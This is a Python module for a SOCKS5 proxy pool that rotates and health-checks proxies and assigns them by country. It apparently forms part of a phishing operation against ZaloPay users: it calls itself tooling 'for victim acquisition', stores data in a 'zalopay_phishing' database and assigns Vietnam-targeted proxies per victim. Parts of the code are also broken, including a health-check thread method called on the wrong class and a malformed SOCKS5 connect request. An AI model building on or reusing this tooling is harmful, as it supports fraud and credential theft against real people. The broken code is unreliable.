"""
SOCKS5 Proxy Manager
Dynamic proxy assignment and management for victim acquisition
"""

import os
import json
import time
import random
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import ipaddress
import socket
import struct
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ProxyConfig:
    """Proxy configuration"""

    def __init__(self):
        self.proxy_timeout = int(os.getenv("PROXY_TIMEOUT", "30"))
        self.max_failures = int(os.getenv("PROXY_MAX_FAILURES", "3"))
        self.health_check_interval = int(os.getenv("PROXY_HEALTH_CHECK_INTERVAL", "60"))
        self.proxy_rotation_interval = int(os.getenv("PROXY_ROTATION_INTERVAL", "300"))  # 5 minutes
        self.enable_auto_rotation = os.getenv("ENABLE_AUTO_ROTATION", "true").lower() == "true"
        self.max_sessions_per_proxy = int(os.getenv("MAX_SESSIONS_PER_PROXY", "10"))
        self.geo_targeting_enabled = os.getenv("GEO_TARGETING_ENABLED", "true").lower() == "true"

class ProxyInfo:
    """Proxy information container"""

    def __init__(self, host: str, port: int, username: str = None, password: str = None,
                 country: str = None, region: str = None, city: str = None,
                 proxy_type: str = "socks5", response_time: int = None):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.country = country
        self.region = region
        self.city = city
        self.proxy_type = proxy_type
        self.response_time = response_time

        # Status tracking
        self.is_active = True
        self.is_healthy = True
        self.failure_count = 0
        self.last_health_check = None
        self.last_used = None
        self.session_count = 0
        self.total_requests = 0
        self.successful_requests = 0

        # Performance metrics
        self.avg_response_time = 0.0
        self.uptime_percentage = 100.0

    def get_address(self) -> str:
        """Get proxy address string"""
        return f"{self.host}:{self.port}"

    def get_auth_string(self) -> str:
        """Get authentication string for proxy"""
        if self.username and self.password:
            return f"{self.username}:{self.password}"
        return ""

    def mark_success(self, response_time: int = None):
        """Mark proxy as successful"""
        self.total_requests += 1
        self.successful_requests += 1
        self.last_used = datetime.now(timezone.utc)

        if response_time:
            # Update average response time
            if self.avg_response_time == 0:
                self.avg_response_time = response_time
            else:
                self.avg_response_time = (self.avg_response_time + response_time) / 2

        # Reset failure count on success
        if self.failure_count > 0:
            self.failure_count = 0

    def mark_failure(self):
        """Mark proxy as failed"""
        self.total_requests += 1
        self.failure_count += 1

        # Check if proxy should be disabled
        if self.failure_count >= 3:
            self.is_healthy = False
            logger.warning(f"Proxy {self.get_address()} disabled due to failures")

    def update_health_status(self, is_healthy: bool, response_time: int = None):
        """Update health status"""
        self.is_healthy = is_healthy
        self.last_health_check = datetime.now(timezone.utc)

        if response_time:
            self.response_time = response_time

    def can_accept_session(self) -> bool:
        """Check if proxy can accept new session"""
        return (self.is_active and self.is_healthy and
                self.session_count < 10 and self.failure_count < 3)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "host": self.host,
            "port": self.port,
            "username": self.username,
            "country": self.country,
            "region": self.region,
            "city": self.city,
            "proxy_type": self.proxy_type,
            "is_active": self.is_active,
            "is_healthy": self.is_healthy,
            "failure_count": self.failure_count,
            "last_health_check": self.last_health_check.isoformat() if self.last_health_check else None,
            "last_used": self.last_used.isoformat() if self.last_used else None,
            "session_count": self.session_count,
            "total_requests": self.total_requests,
            "successful_requests": self.successful_requests,
            "avg_response_time": self.avg_response_time,
            "uptime_percentage": self.uptime_percentage,
            "response_time": self.response_time
        }

class ProxyPool:
    """Proxy pool management"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.proxies: Dict[str, ProxyInfo] = {}
        self.country_proxies: Dict[str, List[str]] = {}  # country -> proxy_ids
        self.sessions: Dict[str, str] = {}  # session_id -> proxy_id
        self._initialized = False

        # Start health check thread
        self._start_health_check_thread()
    
    async def initialize(self):
        """Initialize proxy pool by loading proxies from database"""
        if self._initialized:
            return
        
        # Load proxies from configuration
        await self._load_proxies_from_config()
        self._initialized = True

    async def _load_proxies_from_config(self):
        """Load proxies from MongoDB database"""
        try:
            # First try to load from MongoDB
            if self.mongodb:
                await self._load_proxies_from_mongodb()
            
            # If no proxies loaded from MongoDB, try environment/file fallback
            if not self.proxies:
                await self._load_proxies_from_fallback()

            logger.info(f"Loaded {len(self.proxies)} proxies")

        except Exception as e:
            logger.error(f"Error loading proxies: {e}")
    
    async def _load_proxies_from_mongodb(self):
        """Load proxies from MongoDB database"""
        try:
            if not self.mongodb:
                return
            
            db = self.mongodb.get_database("zalopay_phishing")
            proxies_collection = db.proxies
            
            # Get all active proxies
            cursor = proxies_collection.find({"status": "active"})
            proxies_data = await cursor.to_list(length=1000)
            
            for proxy_data in proxies_data:
                try:
                    # Parse proxy URL
                    proxy_url = proxy_data.get("proxy_url", "")
                    if not proxy_url:
                        continue
                    
                    # Parse URL to extract components
                    from urllib.parse import urlparse
                    parsed = urlparse(proxy_url)
                    
                    proxy = ProxyInfo(
                        host=parsed.hostname,
                        port=parsed.port,
                        username=proxy_data.get("username") or parsed.username,
                        password=proxy_data.get("password") or parsed.password,
                        country=proxy_data.get("country"),
                        region=proxy_data.get("region"),
                        city=proxy_data.get("city"),
                        proxy_type=proxy_data.get("type", parsed.scheme or "socks5"),
                        response_time=proxy_data.get("avg_response_time")
                    )
                    
                    # Set health status from database
                    proxy.is_healthy = proxy_data.get("status") == "active"
                    proxy.success_rate = proxy_data.get("success_rate", 100)
                    proxy.last_health_check = proxy_data.get("last_check")
                    
                    self.add_proxy(proxy)
                    
                except Exception as e:
                    logger.error(f"Error parsing proxy data: {e}")
                    continue
            
            logger.info(f"Loaded {len(proxies_data)} proxies from MongoDB")
            
        except Exception as e:
            logger.error(f"Error loading proxies from MongoDB: {e}")
    
    async def _load_proxies_from_fallback(self):
        """Load proxies from environment/file as fallback"""
        try:
            # Load from environment variable (JSON format)
            proxies_json = os.getenv("PROXY_LIST")
            if proxies_json:
                proxies_data = json.loads(proxies_json)

                for proxy_data in proxies_data:
                    proxy = ProxyInfo(
                        host=proxy_data["host"],
                        port=proxy_data["port"],
                        username=proxy_data.get("username"),
                        password=proxy_data.get("password"),
                        country=proxy_data.get("country"),
                        region=proxy_data.get("region"),
                        city=proxy_data.get("city"),
                        proxy_type=proxy_data.get("type", "socks5")
                    )

                    self.add_proxy(proxy)

            # Load from file if exists
            proxy_file = os.getenv("PROXY_FILE", "proxies.json")
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    proxies_data = json.load(f)

                for proxy_data in proxies_data:
                    proxy = ProxyInfo(
                        host=proxy_data["host"],
                        port=proxy_data["port"],
                        username=proxy_data.get("username"),
                        password=proxy_data.get("password"),
                        country=proxy_data.get("country"),
                        region=proxy_data.get("region"),
                        city=proxy_data.get("city"),
                        proxy_type=proxy_data.get("type", "socks5")
                    )

                    self.add_proxy(proxy)
            
            logger.info(f"Loaded {len(self.proxies)} proxies from fallback sources")
            
        except Exception as e:
            logger.error(f"Error loading proxies from fallback: {e}")

    def add_proxy(self, proxy: ProxyInfo) -> bool:
        """Add proxy to pool"""
        try:
            proxy_id = proxy.get_address()

            self.proxies[proxy_id] = proxy

            # Add to country index
            if proxy.country:
                if proxy.country not in self.country_proxies:
                    self.country_proxies[proxy.country] = []
                self.country_proxies[proxy.country].append(proxy_id)

            # Store in database
            if self.mongodb:
                self._store_proxy_in_db(proxy)

            logger.info(f"Proxy added: {proxy_id}")
            return True

        except Exception as e:
            logger.error(f"Error adding proxy: {e}")
            return False

    def remove_proxy(self, proxy_id: str) -> bool:
        """Remove proxy from pool"""
        try:
            if proxy_id not in self.proxies:
                return False

            proxy = self.proxies[proxy_id]

            # Remove from country index
            if proxy.country and proxy.country in self.country_proxies:
                if proxy_id in self.country_proxies[proxy.country]:
                    self.country_proxies[proxy.country].remove(proxy_id)

            # Remove proxy
            del self.proxies[proxy_id]

            # Remove from database
            if self.mongodb:
                self._remove_proxy_from_db(proxy_id)

            logger.info(f"Proxy removed: {proxy_id}")
            return True

        except Exception as e:
            logger.error(f"Error removing proxy: {e}")
            return False

    def get_proxy(self, proxy_id: str) -> Optional[ProxyInfo]:
        """Get proxy by ID"""
        return self.proxies.get(proxy_id)

    def get_healthy_proxies(self, country: str = None) -> List[ProxyInfo]:
        """Get healthy proxies, optionally filtered by country"""
        healthy_proxies = []

        for proxy in self.proxies.values():
            if proxy.can_accept_session():
                if country is None or proxy.country == country:
                    healthy_proxies.append(proxy)

        return healthy_proxies

    def get_random_proxy(self, country: str = None) -> Optional[ProxyInfo]:
        """Get random healthy proxy"""
        healthy_proxies = self.get_healthy_proxies(country)

        if not healthy_proxies:
            return None

        return random.choice(healthy_proxies)

    def assign_proxy_to_session(self, session_id: str, country: str = None) -> Optional[ProxyInfo]:
        """Assign proxy to session"""
        proxy = self.get_random_proxy(country)

        if proxy:
            proxy.session_count += 1
            self.sessions[session_id] = proxy.get_address()

            # Store assignment in Redis
            if self.redis:
                key = f"session_proxy:{session_id}"
                self.redis.setex(key, 3600, proxy.get_address())  # 1 hour

            logger.info(f"Proxy {proxy.get_address()} assigned to session {session_id}")

        return proxy

    def release_session_proxy(self, session_id: str) -> bool:
        """Release proxy from session"""
        try:
            proxy_id = self.sessions.get(session_id)
            if not proxy_id:
                return False

            proxy = self.proxies.get(proxy_id)
            if proxy:
                proxy.session_count = max(0, proxy.session_count - 1)

            # Remove assignment
            del self.sessions[session_id]

            # Remove from Redis
            if self.redis:
                key = f"session_proxy:{session_id}"
                self.redis.delete(key)

            logger.info(f"Proxy {proxy_id} released from session {session_id}")
            return True

        except Exception as e:
            logger.error(f"Error releasing session proxy: {e}")
            return False

    def _store_proxy_in_db(self, proxy: ProxyInfo):
        """Store proxy in MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            proxies_collection = db.proxies

            document = proxy.to_dict()
            document["created_at"] = datetime.now(timezone.utc)

            proxies_collection.replace_one(
                {"host": proxy.host, "port": proxy.port},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing proxy in database: {e}")

    def _remove_proxy_from_db(self, proxy_id: str):
        """Remove proxy from MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            proxies_collection = db.proxies

            # Parse proxy_id to get host and port
            if ":" in proxy_id:
                host, port = proxy_id.rsplit(":", 1)
                proxies_collection.delete_one({"host": host, "port": int(port)})

        except Exception as e:
            logger.error(f"Error removing proxy from database: {e}")

class ProxyHealthChecker:
    """Proxy health checking"""

    def __init__(self, proxy_pool: ProxyPool):
        self.proxy_pool = proxy_pool
        self.health_check_thread = None

    def _start_health_check_thread(self):
        """Start health check thread"""
        if self.health_check_thread is None:
            self.health_check_thread = threading.Thread(target=self._health_check_loop, daemon=True)
            self.health_check_thread.start()

    def _health_check_loop(self):
        """Health check loop"""
        while True:
            try:
                time.sleep(60)  # Check every minute
                self.perform_health_checks()
            except Exception as e:
                logger.error(f"Error in health check loop: {e}")

    def perform_health_checks(self) -> Dict[str, Any]:
        """Perform health checks on all proxies"""
        results = {}

        for proxy_id, proxy in self.proxy_pool.proxies.items():
            try:
                is_healthy, response_time = self._check_proxy_health(proxy)
                proxy.update_health_status(is_healthy, response_time)
                results[proxy_id] = {
                    "healthy": is_healthy,
                    "response_time": response_time
                }

            except Exception as e:
                logger.error(f"Error checking proxy {proxy_id}: {e}")
                proxy.update_health_status(False)
                results[proxy_id] = {
                    "healthy": False,
                    "error": str(e)
                }

        return results

    def _check_proxy_health(self, proxy: ProxyInfo) -> Tuple[bool, Optional[int]]:
        """Check individual proxy health"""
        try:
            start_time = time.time()

            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # 10 second timeout

            # SOCKS5 handshake
            if not self._perform_socks5_handshake(sock, proxy):
                sock.close()
                return False, None

            # Test connection to a reliable endpoint
            test_host = "httpbin.org"
            test_port = 80

            if self._connect_through_proxy(sock, proxy, test_host, test_port):
                response_time = int((time.time() - start_time) * 1000)

                # Send simple HTTP request
                request = f"GET /ip HTTP/1.1\r\nHost: {test_host}\r\nConnection: close\r\n\r\n"
                sock.send(request.encode())

                # Read response
                response = sock.recv(1024)
                if b"200 OK" in response or b"HTTP/1.1" in response:
                    sock.close()
                    return True, response_time

            sock.close()
            return False, None

        except Exception as e:
            logger.error(f"Error checking proxy health: {e}")
            return False, None

    def _perform_socks5_handshake(self, sock: socket.socket, proxy: ProxyInfo) -> bool:
        """Perform SOCKS5 handshake"""
        try:
            # SOCKS5 greeting
            greeting = struct.pack('BBB', 0x05, 0x01, 0x00)  # No auth
            sock.send(greeting)

            # Read greeting response
            response = sock.recv(2)
            if len(response) != 2 or response[0] != 0x05:
                return False

            # If auth is required
            if response[1] == 0x02:  # Username/password auth
                if not proxy.username or not proxy.password:
                    return False

                # Send username/password auth
                username_bytes = proxy.username.encode()
                password_bytes = proxy.password.encode()

                auth_request = struct.pack(f'B{len(username_bytes)}sB{len(password_bytes)}s',
                                        0x01, username_bytes, len(password_bytes), password_bytes)
                sock.send(struct.pack('B', len(auth_request)) + auth_request)

                # Read auth response
                auth_response = sock.recv(2)
                if len(auth_response) != 2 or auth_response[1] != 0x00:
                    return False

            return True

        except Exception as e:
            logger.error(f"Error in SOCKS5 handshake: {e}")
            return False

    def _connect_through_proxy(self, sock: socket.socket, proxy: ProxyInfo,
                             target_host: str, target_port: int) -> bool:
        """Connect through proxy to target"""
        try:
            # SOCKS5 connect request
            target_ip = socket.gethostbyname(target_host)

            # Build connect request
            addr_type = 0x01  # IPv4
            connect_request = struct.pack(f'>BBBB{len(target_ip)}sH',
                                        0x05, 0x01, 0x00, addr_type, target_ip.encode(), target_port)

            sock.send(connect_request)

            # Read connect response
            connect_response = sock.recv(10)
            if len(connect_response) < 10 or connect_response[1] != 0x00:
                return False

            return True

        except Exception as e:
            logger.error(f"Error connecting through proxy: {e}")
            return False

class ProxyManager:
    """Main proxy manager"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = ProxyConfig()
        self.proxy_pool = ProxyPool(mongodb_connection, redis_client)
        self.health_checker = ProxyHealthChecker(self.proxy_pool)
        
        # Advanced components (will be initialized separately)
        self.orchestrator = None
        self.health_monitor = None
    
    async def initialize(self):
        """Initialize proxy manager"""
        await self.proxy_pool.initialize()

    def get_proxy_for_session(self, session_id: str, country: str = None) -> Optional[ProxyInfo]:
        """Get proxy for session"""
        return self.proxy_pool.assign_proxy_to_session(session_id, country)

    def release_session_proxy(self, session_id: str) -> bool:
        """Release proxy for session"""
        return self.proxy_pool.release_session_proxy(session_id)

    def get_available_proxies(self, country: str = None) -> List[Dict[str, Any]]:
        """Get available proxies"""
        proxies = self.proxy_pool.get_healthy_proxies(country)
        return [proxy.to_dict() for proxy in proxies]

    def add_proxy(self, host: str, port: int, username: str = None, password: str = None,
                 country: str = None, region: str = None, city: str = None) -> bool:
        """Add new proxy"""
        proxy = ProxyInfo(
            host=host, port=port, username=username, password=password,
            country=country, region=region, city=city
        )
        return self.proxy_pool.add_proxy(proxy)

    def remove_proxy(self, host: str, port: int) -> bool:
        """Remove proxy"""
        proxy_id = f"{host}:{port}"
        return self.proxy_pool.remove_proxy(proxy_id)

    def get_proxy_stats(self) -> Dict[str, Any]:
        """Get proxy statistics"""
        total_proxies = len(self.proxy_pool.proxies)
        healthy_proxies = len(self.proxy_pool.get_healthy_proxies())
        total_sessions = len(self.proxy_pool.sessions)

        # Country distribution
        country_stats = {}
        for proxy in self.proxy_pool.proxies.values():
            country = proxy.country or "Unknown"
            country_stats[country] = country_stats.get(country, 0) + 1

        return {
            "total_proxies": total_proxies,
            "healthy_proxies": healthy_proxies,
            "active_sessions": total_sessions,
            "country_distribution": country_stats,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

    def perform_health_checks(self) -> Dict[str, Any]:
        """Perform health checks on all proxies"""
        return self.health_checker.perform_health_checks()

    def get_session_proxy(self, session_id: str) -> Optional[str]:
        """Get proxy for session"""
        return self.proxy_pool.sessions.get(session_id)
    
    def initialize_advanced_components(self):
        """Initialize advanced proxy components"""
        try:
            # Import here to avoid circular imports
            from engines.advanced.proxy_orchestrator import ProxyOrchestrator
            from engines.advanced.proxy_health_monitor import ProxyHealthMonitor
            
            # Initialize orchestrator
            self.orchestrator = ProxyOrchestrator(self, self.mongodb, self.redis)
            
            # Initialize health monitor
            self.health_monitor = ProxyHealthMonitor(self, self.mongodb, self.redis)
            
            logger.info("Advanced proxy components initialized")
            
        except Exception as e:
            logger.error(f"Error initializing advanced components: {e}")
    
    def assign_proxy_for_victim(self, victim_id: str, session_id: str, 
                              geographic_preference: str = "VN") -> Optional[ProxyInfo]:
        """Assign proxy for victim using advanced orchestration"""
        if self.orchestrator:
            return self.orchestrator.assign_proxy_for_victim(victim_id, session_id, geographic_preference)
        else:
            # Fallback to basic assignment
            return self.get_proxy_for_session(session_id, geographic_preference)
    
    def release_victim_proxy(self, victim_id: str, session_id: str) -> bool:
        """Release victim proxy using advanced orchestration"""
        if self.orchestrator:
            return self.orchestrator.release_victim_proxy(victim_id, session_id)
        else:
            # Fallback to basic release
            return self.release_session_proxy(session_id)
    
    def get_advanced_stats(self) -> Dict[str, Any]:
        """Get advanced proxy statistics"""
        stats = self.get_proxy_stats()
        
        if self.orchestrator:
            stats["orchestrator"] = self.orchestrator.get_orchestrator_stats()
        
        if self.health_monitor:
            stats["health_monitor"] = self.health_monitor.get_health_monitor_stats()
        
        return stats

# Global proxy manager instance
proxy_manager = None

async def initialize_proxy_manager(mongodb_connection=None, redis_client=None) -> ProxyManager:
    """Initialize global proxy manager"""
    global proxy_manager
    proxy_manager = ProxyManager(mongodb_connection, redis_client)
    
    # Initialize proxy manager
    await proxy_manager.initialize()
    
    # Initialize advanced components
    proxy_manager.initialize_advanced_components()
    
    return proxy_manager

def get_proxy_manager() -> ProxyManager:
    """Get global proxy manager"""
    if proxy_manager is None:
        raise ValueError("Proxy manager not initialized")
    return proxy_manager

# Convenience functions
def get_proxy_for_session(session_id: str, country: str = None) -> Optional[ProxyInfo]:
    """Get proxy for session (global convenience function)"""
    return get_proxy_manager().get_proxy_for_session(session_id, country)

def release_session_proxy(session_id: str) -> bool:
    """Release session proxy (global convenience function)"""
    return get_proxy_manager().release_session_proxy(session_id)

def add_proxy(host: str, port: int, username: str = None, password: str = None,
             country: str = None) -> bool:
    """Add proxy (global convenience function)"""
    return get_proxy_manager().add_proxy(host, port, username, password, country)

def get_available_proxies(country: str = None) -> List[Dict[str, Any]]:
    """Get available proxies (global convenience function)"""
    return get_proxy_manager().get_available_proxies(country)